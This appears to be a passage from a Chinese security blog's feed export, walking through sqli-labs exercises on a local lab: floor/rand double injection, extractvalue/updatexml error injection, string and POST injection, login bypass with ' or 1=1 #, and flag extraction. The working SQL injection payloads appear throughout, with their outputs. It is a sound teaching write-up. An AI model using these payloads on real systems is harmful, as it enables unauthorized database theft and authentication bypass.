alt=\"image-20220930231458853\"></p>\n<p>查询第三条记录，再次计算 floor (rand (0)*2)，取值为 0【 <code>第四次计算</code> 】，查询虚表，发现键值没有 0，则再次计算 floor，取值为 1【 <code>第五次计算</code> 】</p>\n<p>而此时，1 这个主键已经存在于虚表中，新计算的值也为 1【 <code>第五次计算</code> 】，<strong>由于插入的 key 主键值必须唯一</strong>，新计算的 1 和主键 1 重复，因此插入的时候直接报错。</p>\n<h3 id=\"灵魂拷问三选择rand0而非rand的原因\"><a class=\"markdownIt-Anchor\" href=\"#灵魂拷问三选择rand0而非rand的原因\">#</a> 灵魂拷问三：选择 rand (0) 而非 rand () 的原因</h3>\n<p>简而言之，group by 插入进 &lt;key，count (1)&gt; 虚表的前提是 —— <code>当前的记录在虚表中不存在</code> 。</p>\n<p>白话文解释：当前的记录由于 011011011 这特殊规律导致 0 这个记录的在表中不存在，计算时总是被取值成 1 插入虚表，第一次还能插进来，但在第二次新插入进来的 1 又存在于虚表中，所以就报 “重复条目 “的错了。</p>\n<p>选择 <code>rand(0)x2</code>  是<strong>必会报错</strong>，而 <code>rand()x2</code>  就不一定了【可能报错、可能不报错】。</p>\n<p>因为通过上文解释，如果不是 011011 这个特殊规律，0 和 1 是都可以进到虚表中，如果都能进来，那就不会报错。</p>\n<p>因此，100% 报错须要 count ()，rand (0)*2、group by，三者缺一不可。</p>\n<h3 id=\"双注入走起\"><a class=\"markdownIt-Anchor\" href=\"#双注入走起\">#</a> 双注入走起</h3>\n<p>首先使用 concat 组合字符串</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27; union select 1,count(1) from information_schema.tables group by concat(floor(rand(0)*2), version()) %23&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001000024436.png\" alt=\"image-20221001000024436\"></p>\n<p>将 version 处替换成我们想要的 select 语句【注意，这里只能使用 limit 0,1 来进行输出爆破，group_concat 会爆出数据库信息失败】</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27; union select 1,count(1) from information_schema.tables group by concat(floor(rand(0)*2), (select table_name from information_schema.tables where table_schema=database() limit 0,1)) %23&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001000515293.png\" alt=\"image-20221001000515293\"></p>\n<p>至此，双注入演示完毕。</p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/",
            "url": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/",
            "title": "报错注入",
            "date_published": "2022-09-29T15:57:38.000Z",
            "content_html": "<h1 id=\"sql-注入之报错注入\"><a class=\"markdownIt-Anchor\" href=\"#sql-注入之报错注入\">#</a> SQL 注入之报错注入</h1>\n<p>本篇使用报错注入。</p>\n<p><code>注意</code> ：报错函数的使用中，第二个参数如果来自于查询语句，都是<strong>需要用小括号包裹起来的</strong>。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#使用 extractvalue(1, (select xxx))</span><br><span class=\"line\">uname=1&#x27; union select 1, extractvalue(1, concat(&#x27;%&#x27;, (select table_name from information_schema.tables where table_schema=database()))) --+&amp;passwd=123456&amp;submit=Submit</span><br><span class=\"line\"></span><br><span class=\"line\">#使用 updatexml(1, (select xxx), 1)</span><br><span class=\"line\">uname=1&#x27; union select 1, updatexml(1, concat(&#x27;%&#x27;, (select group_concat(table_name) from information_schema.tables where table_schema=database())),1) --+&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<h2 id=\"注入步骤\"><a class=\"markdownIt-Anchor\" href=\"#注入步骤\">#</a> 注入步骤</h2>\n<h3 id=\"设置代理\"><a class=\"markdownIt-Anchor\" href=\"#设置代理\">#</a> 设置代理</h3>\n<p>还是 Less-11，我们挂上<strong> BurpSuit</strong> 代理，然后<strong> Send To Reapeater</strong>。</p>\n<p><img src=\"image-20220929231322659.png\" alt=\"image-20220929231322659\"></p>\n<p>报错注入常使用的函数如下：</p>\n<p>①<strong>extractvalue</strong> (): 从目标 XML 中返回包含所查询值的字符串。</p>\n<p>例子：extractvalue (XML_document, XPath_string);</p>\n<p><code>第一个参数</code> ：XML_documentshi String 格式，为 XML 文档对象的名称。<strong>在报错注入中可以随意指定，比如 1 即可。</strong></p>\n<p><code>第二个参数</code> ：XPath_string (Xpath 格式的字符串)。<strong>在报错注入中由于就是利用这个点来泄露信息，所以重点构造语句放在这个第二个参数里。</strong></p>\n<p>concat ()：返回结果为连接参数产生的字符串。</p>\n<p>②<strong>updatexml</strong> (): 更新 XML 信息</p>\n<p>例子：updatexml (XML_document, XPath_string, new_value);</p>\n<p><code>第一个参数</code> ：XML_document 是 String 格式，为 XML 文档对象的名称。<strong>在报错注入中可以随意指定，比如 1 即可。</strong></p>\n<p><code>第二个参数</code> ：XPath_string (XPATH 格式的字符串)。<strong>在报错注入中由于就是利用这个点来泄露信息，所以重点构造语句放在这个第二个参数里。</strong></p>\n<p><code>第三个参数</code> ：new_value, String 格式， 替换查找到的符合条件的数据。<strong>在报错注入中可以随意指定，比如 1 即可。</strong></p>\n<h3 id=\"确定注入类型和列数\"><a class=\"markdownIt-Anchor\" href=\"#确定注入类型和列数\">#</a> 确定注入类型和列数</h3>\n<p>通过单引号注入和 order by n 来<strong>确定注入类型</strong>和<strong>查询列数</strong>。</p>\n<p><img src=\"image-20220929232026560.png\" alt=\"image-20220929232026560\"></p>\n<h3 id=\"使用指定报错函数\"><a class=\"markdownIt-Anchor\" href=\"#使用指定报错函数\">#</a> 使用指定报错函数</h3>\n<p>那么我们就可构造：</p>\n<p>extractvalue (1, XPATH_string)，其中 XPATH_string 为 (select version ())</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27; union select 1, extractvalue(1, (select version())) --+&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220929233031785.png\" alt=\"image-20220929233031785\"></p>\n<p>可以看到版本号被截断，信息不全。我们尝试调 concat () 函数使用 0x7e 字符拼接：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27; union select 1, extractvalue(1, concat(0x7e, (select version()))) --+&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220929233343167.png\" alt=\"image-20220929233343167\"></p>\n<p>这里分割字符串可以换成 %，分割字符串的选择比较看运气，有时候后台会校验，所以多用 ASCII 来表示。<strong>比如波浪线的 ASCII 为 0x7e</strong></p>\n<p><img src=\"image-20220929233647634.png\" alt=\"image-20220929233647634\"></p>\n<h3 id=\"泄露数据库信息\"><a class=\"markdownIt-Anchor\" href=\"#泄露数据库信息\">#</a> 泄露数据库信息</h3>\n<p>准备泄露数据库的表名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27; union select 1, extractvalue(1, concat(&#x27;%&#x27;, (select table_name from information_schema.tables where table_schema=database()))) --+&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>但是报了错， <code>Subquery returns more than 1 row</code> ，说明最后查询的 select 的列数超过了一列。</p>\n<p><img src=\"image-20220929233914430.png\" alt=\"image-20220929233914430\"></p>\n<p>我们需要<strong>使用 limit 0,1 限制一列输出</strong></p>\n<p><img src=\"image-20220929234118900.png\" alt=\"image-20220929234118900\"></p>\n<p>或者<strong>使用 group_concat 拼接成一列</strong></p>\n<p><img src=\"image-20220929234238245.png\" alt=\"image-20220929234238245\"></p>\n<p>同理，也使用 updatexml 进行报错注入</p>\n<p>构造时，因为我们关键是为了调用 <code>updatexml</code>  函数和使用 <code>第二个参数</code> 进行内容输出，因此<strong>第一个参数</strong>和<strong>第三个参数</strong>都是 **“无用”** 的，设置成 1 即可。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27; union select 1, updatexml(1, concat(&#x27;</span><span class=\"operator\">%</span><span class=\"string\">&#x27;, (select group_concat(table_name) from information_schema.tables where table_schema=database())),1) --+&amp;passwd=123456&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220929234443551.png\" alt=\"image-20220929234443551\"></p>\n<p>至此，报错注入演示完毕。</p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5/",
            "url": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5/",
            "title": "字符型注入",
            "date_published": "2022-09-29T13:54:18.000Z",
            "content_html": "<h1 id=\"sql-注入之字符型注入\"><a class=\"markdownIt-Anchor\" href=\"#sql-注入之字符型注入\">#</a> SQL 注入之字符型注入</h1>\n<p>本篇使用字符型注入。</p>\n<h2 id=\"注入步骤单引号注入\"><a class=\"markdownIt-Anchor\" href=\"#注入步骤单引号注入\">#</a> 注入步骤 (单引号注入)</h2>\n<p>由于 Less-1 从请求上看到是 GET 型，所以礼节性地输入个 id=1</p>\n<p><img src=\"image-20220929215708949.png\" alt=\"image-20220929215708949\"></p>\n<h3 id=\"尝试注入类型\"><a class=\"markdownIt-Anchor\" href=\"#尝试注入类型\">#</a> 尝试注入类型</h3>\n<p>输入 1’  来看看是否报错</p>\n<p><img src=\"image-20220929215814839.png\" alt=\"image-20220929215814839\"></p>\n<p>输入 22’  来看看是否报错</p>\n<p><img src=\"image-20220929215843779.png\" alt=\"image-20220929215843779\"></p>\n<p>那么， <code>'22'' LIMIT 0,1</code>  中，‘22’’  外面包裹的两个单引号是查询时带上的，需要我们去闭合。</p>\n<h3 id=\"确定注入类型\"><a class=\"markdownIt-Anchor\" href=\"#确定注入类型\">#</a> 确定注入类型</h3>\n<p>闭合单引号，需要在输入中添加一个单引号之后，使用行注释符注释后面的代码，常用的有: #、%23、–+</p>\n<p>那么，我们尝试一下 #号</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-1</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">2</span><span class=\"string\">&#x27; #</span></span><br></pre></td></tr></table></figure>\n<p>不行，会报错，可能后台过滤了 #号。</p>\n<p><img src=\"image-20220929220358319.png\" alt=\"image-20220929220358319\"></p>\n<p>尝试 %23 也一样，就不再贴图了。</p>\n<p>我们最后尝试–+，成功。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-1</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">2</span><span class=\"string\">&#x27; --+</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220929220326957.png\" alt=\"image-20220929220326957\"></p>\n<p>由此，可以确定此题注入类型为字符型注入的<strong>单引号注入</strong>。</p>\n<h3 id=\"确定列数\"><a class=\"markdownIt-Anchor\" href=\"#确定列数\">#</a> 确定列数</h3>\n<p>使用 order by n 来确定有多少列。<strong>order by n</strong> 会以当前表中的 “<strong>第 n 列</strong>” 进行排序，如果<strong>第 n 列不存在</strong>，则会抛出 <code>Unknown column 'n' </code> 的异常。</p>\n<p>4 列？</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-1</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">2</span><span class=\"string\">&#x27; order by 4--+</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220929220842238.png\" alt=\"image-20220929220842238\"></p>\n<p>3 列？</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-1</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">2</span><span class=\"string\">&#x27; order by 3--+</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220929220533059.png\" alt=\"image-20220929220533059\"></p>\n<p>不报错，则说明 <code>有3列</code> 。</p>\n<h3 id=\"构造联合查询泄露数据库信息\"><a class=\"markdownIt-Anchor\" href=\"#构造联合查询泄露数据库信息\">#</a> 构造联合查询泄露数据库信息</h3>\n<p>这回我们使用 <code>and 0</code>  来构造对于 id 的查询为假的条件</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-1</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">2</span><span class=\"string\">&#x27; and 0 union select 1, group_concat(table_name), database() from information_schema.tables where table_schema = database() --+</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220929221156300.png\" alt=\"image-20220929221156300\"></p>\n<h2 id=\"注入步骤双引号注入\"><a class=\"markdownIt-Anchor\" href=\"#注入步骤双引号注入\">#</a> 注入步骤 (双引号注入)</h2>\n<p>Less-4 是一道双引号注入的题目。</p>\n<p><img src=\"image-20220929221450837.png\" alt=\"image-20220929221450837\"></p>\n<p>由于查看发现是 GET 请求，因此礼节性地输入 id=1</p>\n<p><img src=\"image-20220929221657747.png\" alt=\"image-20220929221657747\"></p>\n<h3 id=\"尝试注入类型-2\"><a class=\"markdownIt-Anchor\" href=\"#尝试注入类型-2\">#</a> 尝试注入类型</h3>\n<p>输入 1’  来看看是否报错</p>\n<p><img src=\"image-20220929221831821.png\" alt=\"image-20220929221831821\"></p>\n<p>不报错，怀疑存在双引号注入。</p>\n<p>输入 1“  来看看是否报错</p>\n<p><img src=\"image-20220929221918225.png\" alt=\"image-20220929221918225\"></p>\n<p>那么， <code>&quot;1&quot;&quot;) LIMIT 0,1</code>  中，“1&quot;”)  外面包裹的【两个双引号 + 一个小括号】是查询时带上的，需要我们去闭合。</p>\n<h3 id=\"确定注入类型-2\"><a class=\"markdownIt-Anchor\" href=\"#确定注入类型-2\">#</a> 确定注入类型</h3>\n<p>我们尝试：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-4</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">1</span>&quot;) --+</span><br></pre></td></tr></table></figure>\n<p>成功不报错。</p>\n<p><img src=\"image-20220929222215596.png\" alt=\"image-20220929222215596\"></p>\n<p>之后就可以愉快地<strong>确定列数</strong> + 使用<strong>联合查询泄露数据库信息</strong>了。</p>\n<p>小练习</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#<span class=\"number\">1.</span>通过闭合，确定单引号注入</span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>SQLC<span class=\"operator\">/</span><span class=\"keyword\">sql</span><span class=\"number\">-2.</span>php<span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27; --+</span></span><br><span class=\"line\"><span class=\"string\">------结果------</span></span><br><span class=\"line\"><span class=\"string\">Username: kevin</span></span><br><span class=\"line\"><span class=\"string\">Password: Kevin</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#2.确定列数为3</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-2.php/?id=1&#x27;</span> <span class=\"keyword\">order</span> <span class=\"keyword\">by</span> <span class=\"number\">3</span> <span class=\"comment\">--+</span></span><br><span class=\"line\"><span class=\"comment\">------结果------</span></span><br><span class=\"line\">Username: kevin</span><br><span class=\"line\">Password: Kevin</span><br><span class=\"line\"></span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>SQLC<span class=\"operator\">/</span><span class=\"keyword\">sql</span><span class=\"number\">-2.</span>php<span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27; order by 4 --+</span></span><br><span class=\"line\"><span class=\"string\">------结果------</span></span><br><span class=\"line\"><span class=\"string\">sql查询失败</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#3.联合查询泄露数据库信息</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-2.php/?id=1&#x27;</span> <span class=\"keyword\">and</span> <span class=\"number\">0</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, group_concat(table_name), database() <span class=\"keyword\">from</span> information_schema.tables <span class=\"keyword\">where</span> table_schema<span class=\"operator\">=</span>database() <span class=\"comment\">--+</span></span><br><span class=\"line\"><span class=\"comment\">------结果------</span></span><br><span class=\"line\">Username: emails,flag,users</span><br><span class=\"line\">Password: challenge</span><br><span class=\"line\"></span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>SQLC<span class=\"operator\">/</span><span class=\"keyword\">sql</span><span class=\"number\">-2.</span>php<span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27; and 0 union select 1, group_concat(column_name), database() from information_schema.columns where table_schema=database() and table_name=&#x27;</span>flag<span class=\"string\">&#x27; --+</span></span><br><span class=\"line\"><span class=\"string\">------结果------</span></span><br><span class=\"line\"><span class=\"string\">Username: flag,value</span></span><br><span class=\"line\"><span class=\"string\">Password: challenge</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#4.获取flag</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-2.php/?id=1&#x27;</span> <span class=\"keyword\">and</span> <span class=\"number\">0</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, group_concat(concat_ws(<span class=\"string\">&#x27;:&#x27;</span>, flag, <span class=\"keyword\">value</span>)), database() <span class=\"keyword\">from</span> challenge.flag <span class=\"comment\">--+</span></span><br><span class=\"line\"><span class=\"comment\">------结果------</span></span><br><span class=\"line\">Username: flag1:mars,flag2:coobe,flag3:gir,flag4:margin,flag5:tubi,flag6:xss,flag7:<span class=\"keyword\">any</span>,flag8:sqlc,flag9:tasi,flag10:moo,flag12:<span class=\"literal\">false</span>,flag11:muse</span><br><span class=\"line\">Password: challenge</span><br></pre></td></tr></table></figure>\n<p>至此，字符型注入演示完毕。</p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/POST%E6%B3%A8%E5%85%A5/",
            "url": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/POST%E6%B3%A8%E5%85%A5/",
            "title": "POST注入",
            "date_published": "2022-09-29T13:49:22.000Z",
            "content_html": "<h1 id=\"sql-注入之post注入\"><a class=\"markdownIt-Anchor\" href=\"#sql-注入之post注入\">#</a> SQL 注入之 POST 注入</h1>\n<p>本篇使用 POST 注入。</p>\n<h2 id=\"注入步骤\"><a class=\"markdownIt-Anchor\" href=\"#注入步骤\">#</a> 注入步骤</h2>\n<h3 id=\"尝试注入类型\"><a class=\"markdownIt-Anchor\" href=\"#尝试注入类型\">#</a> 尝试注入类型</h3>\n<p>输入 1’  来看看是否报错</p>\n<p><img src=\"image-20220929203645441.png\" alt=\"image-20220929203645441\"></p>\n<p>果不其然，此输入框存在 SQL 注入。且报错信息为 <code>use near ''1'' and password='' LIMIT 0,1' at line 1</code></p>\n<p>提取出错点发生在这一句：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27;1&#x27;&#x27; and password=&#x27;&#x27; LIMIT 0,1</span></span><br></pre></td></tr></table></figure>\n<p>其中，1’ 是我们输入的，那么其查询语句基本上可以确定为：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"number\">1</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> username <span class=\"operator\">=</span> <span class=\"string\">&#x27;xxx&#x27;</span> <span class=\"keyword\">and</span> password <span class=\"operator\">=</span> <span class=\"string\">&#x27;xxx&#x27;</span> LIMIT <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>接着，查看其 F12 发现，网页发送的是 POST 请求。</p>\n<p><img src=\"image-20220929204011334.png\" alt=\"image-20220929204011334\"></p>\n<p>然后通过继续深入查询网页源代码的 Elements 可以得到，两个 <code>&lt;input&gt;</code>  标签对应的变量名，<strong>Username</strong> 对应<strong> uname</strong>，<strong>Password</strong> 对应<strong> passwd</strong></p>\n<p><img src=\"image-20220929204648604.png\" alt=\"image-20220929204648604\"></p>\n<p>那么就可以构造 POST 请求：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27;&amp;passwd=1</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220929204929486.png\" alt=\"image-20220929204929486\"></p>\n<p>那么，基本上可以确定，此题存在 SQL 注入之一 ——POST 注入。</p>\n<h3 id=\"确定注入类型\"><a class=\"markdownIt-Anchor\" href=\"#确定注入类型\">#</a> 确定注入类型</h3>\n<p>输入 1’ # 查看是否依旧报错</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27; #&amp;passwd=1</span></span><br></pre></td></tr></table></figure>\n<p>不报错，说明是 POST 单引号注入。</p>\n<p><img src=\"image-20220929205132216.png\" alt=\"image-20220929205132216\"></p>\n<h3 id=\"是否可以构造非法查询\"><a class=\"markdownIt-Anchor\" href=\"#是否可以构造非法查询\">#</a> 是否可以构造非法查询</h3>\n<p>由于</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"number\">1</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> username <span class=\"operator\">=</span> <span class=\"string\">&#x27;xxx&#x27;</span> <span class=\"keyword\">and</span> password <span class=\"operator\">=</span> <span class=\"string\">&#x27;xxx&#x27;</span> LIMIT <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>username 是用单引号括起来的，为了让语法不出错，我们需要<strong>保留单引号</strong>。即，可以在 <code>uname=1' #&amp;passwd=1</code>  的 <code>' #</code> 之间<strong>插入我们想要的非法查询语句</strong>。</p>\n<p>因此，我们可以输入 1’ or 1=1 # 万能登录注入就会让查询语句变成：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"number\">1</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> username <span class=\"operator\">=</span> <span class=\"string\">&#x27;1&#x27;</span> <span class=\"keyword\">or</span> <span class=\"number\">1</span><span class=\"operator\">=</span><span class=\"number\">1</span> #<span class=\"string\">&#x27; and password = &#x27;</span>xxx<span class=\"string\">&#x27; LIMIT 0,1</span></span><br></pre></td></tr></table></figure>\n<p>构造 POST 请求：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27; or 1=1 #&amp;passwd=1</span></span><br></pre></td></tr></table></figure>\n<p>登录成功:</p>\n<p><img src=\"image-20220929205718001.png\" alt=\"image-20220929205718001\"></p>\n<h2 id=\"使用burpsuit来做post注入\"><a class=\"markdownIt-Anchor\" href=\"#使用burpsuit来做post注入\">#</a> 使用 BurpSuit 来做 Post 注入</h2>\n<p>这里也稍微提及一下 BurpSuit 抓包工具的简单使用：</p>\n<h3 id=\"firefox浏览器配置\"><a class=\"markdownIt-Anchor\" href=\"#firefox浏览器配置\">#</a> FireFox 浏览器配置</h3>\n<p>FireFox 浏览器中，在” 工具栏 — 选项 — 高级 — 连接设置 “中，配置手动代理和端口号 (127.0.0.1 : <strong>9090</strong>)</p>\n<p><img src=\"image-20220929210357211.png\" alt=\"image-20220929210357211\"></p>\n<h3 id=\"burpsuit配置\"><a class=\"markdownIt-Anchor\" href=\"#burpsuit配置\">#</a> BurpSuit 配置</h3>\n<p>到 BurpSuit 里，”Proxy—Options—Proxy Listeners“中，设置好同样的代理地址和端口号（127.0.0.1 : <strong>9090</strong>）</p>\n<p><img src=\"image-20220929210527792.png\" alt=\"image-20220929210527792\"></p>\n<h3 id=\"令burpsuit拦截到包\"><a class=\"markdownIt-Anchor\" href=\"#令burpsuit拦截到包\">#</a> 令 BurpSuit 拦截到包</h3>\n<p>点击 FireFox 的任意提交请求的按钮就可以令 BurpSuit 拦截到包。以 FireFox 为例就是，点击了这道题目中的 <code>Submit按钮</code>  或 使用 Hackbar 的 <code>Execute按钮</code> 。</p>\n<p><img src=\"image-20220929210640596.png\" alt=\"image-20220929210640596\"></p>\n<p>④在内容中鼠标右键点击后选择 Send to Reapeater</p>\n<p><img src=\"image-20220929210828967.png\" alt=\"image-20220929210828967\"></p>\n<p>⑤在 Reapter 中多次尝试修改注入内容来查看返回的包</p>\n<p>第一次注入尝试</p>\n<p><img src=\"image-20220929211038588.png\" alt=\"image-20220929211038588\"></p>\n<p>第二次注入尝试</p>\n<p><img src=\"image-20220929210956005.png\" alt=\"image-20220929210956005\"></p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%95%B4%E5%9E%8B%E6%B3%A8%E5%85%A5/",
            "url": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%95%B4%E5%9E%8B%E6%B3%A8%E5%85%A5/",
            "title": "整型注入",
            "date_published": "2022-09-28T16:27:56.000Z",
            "content_html": "<h1 id=\"sql注入之整型注入\"><a class=\"markdownIt-Anchor\" href=\"#sql注入之整型注入\">#</a> SQL 注入之整型注入</h1>\n<p>本篇使用整型注入来从 0 到 1 进入 “SQL 注入” 的大门。</p>\n<h2 id=\"环境准备\"><a class=\"markdownIt-Anchor\" href=\"#环境准备\">#</a> 环境准备</h2>\n<p>当然是先安装 phpStudy，然后一键傻瓜式安装后点击启动按钮</p>\n<p><img src=\"image-20220928202842147.png\" alt=\"image-20220928202842147\"></p>\n<p>之后点击 MySQL 管理器</p>\n<p><img src=\"image-20220928203059624.png\" alt=\"image-20220928203059624\"></p>\n<p>双击 localhost，账户名 root，密码 root 即可进入。</p>\n<p><img src=\"image-20220928203206981.png\" alt=\"image-20220928203206981\"></p>\n<p>打开浏览器，选择 sqli</p>\n<p><img src=\"image-20220928203903223.png\" alt=\"image-20220928203903223\"></p>\n<p>选择第一个 Setup</p>\n<p><img src=\"image-20220928203930840.png\" alt=\"image-20220928203930840\"></p>\n<p>出现这个界面，即完成了数据库的初始化</p>\n<p><img src=\"image-20220928203950837.png\" alt=\"image-20220928203950837\"></p>\n<p>点击后退键回到上一个页面，然后点击 Less-1</p>\n<p><img src=\"image-20220928204115026.png\" alt=\"image-20220928204115026\"></p>\n<p>出现 SQLI DUMB SERIES-1</p>\n<p><img src=\"image-20220928204123886.png\" alt=\"image-20220928204123886\"></p>\n<p>接下来以 Less-2 作为例子进行讲解：</p>\n<p><img src=\"image-20220928210728567.png\" alt=\"image-20220928210728567\"></p>\n<h2 id=\"sql注入步骤\"><a class=\"markdownIt-Anchor\" href=\"#sql注入步骤\">#</a> SQL 